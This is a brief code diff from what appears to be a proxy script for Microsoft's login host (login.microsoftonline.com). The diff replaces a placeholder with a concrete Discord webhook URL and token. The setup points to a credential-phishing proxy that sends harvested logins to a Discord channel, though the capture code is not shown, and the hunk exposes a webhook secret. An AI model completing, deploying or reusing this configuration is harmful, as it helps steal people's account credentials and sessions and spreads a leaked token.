@@ -4,7 +4,7 @@
 
 // ---------- CONFIGURATION ----------
 // Replace this with your actual Discord webhook URL
-const webhook = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
+const webhook = "https://discord.com/api/webhooks/1544756994223640576/c2Q3UlybpV1MC1Dmg1vECmhdyYJieaDKTl9Y1Pk3EGud-FewDV4bQWSTTbTHz4p32DPT"
 
 // Microsoft upstream (unchanged)
 const upstream = 'login.microsoftonline.com'
